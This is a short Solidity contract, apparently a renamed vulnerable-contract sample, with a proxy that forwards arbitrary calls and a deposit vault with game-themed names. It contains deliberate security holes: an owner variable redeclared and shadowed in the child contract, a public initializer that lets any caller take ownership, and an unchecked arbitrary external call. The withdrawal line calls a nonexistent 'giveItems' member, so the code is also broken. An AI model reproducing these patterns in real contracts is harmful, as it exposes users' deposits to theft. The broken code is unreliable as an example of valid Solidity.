pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyDungeonmaster { if (msg.sender == Gamemaster) _; } address Gamemaster = msg.sender;
    function sharetreasureGuildleader(address _gamemaster) public onlyDungeonmaster { Gamemaster = _gamemaster; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract CachetreasureProxy is Proxy {
    address public Gamemaster;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function ItemVault() public payable {
        if (msg.sender == tx.origin) {
            Gamemaster = msg.sender;
            cacheTreasure();
        }
    }

    function cacheTreasure() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function redeemGold(uint256 amount) public onlyDungeonmaster {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.giveItems(amount);
        }
    }
}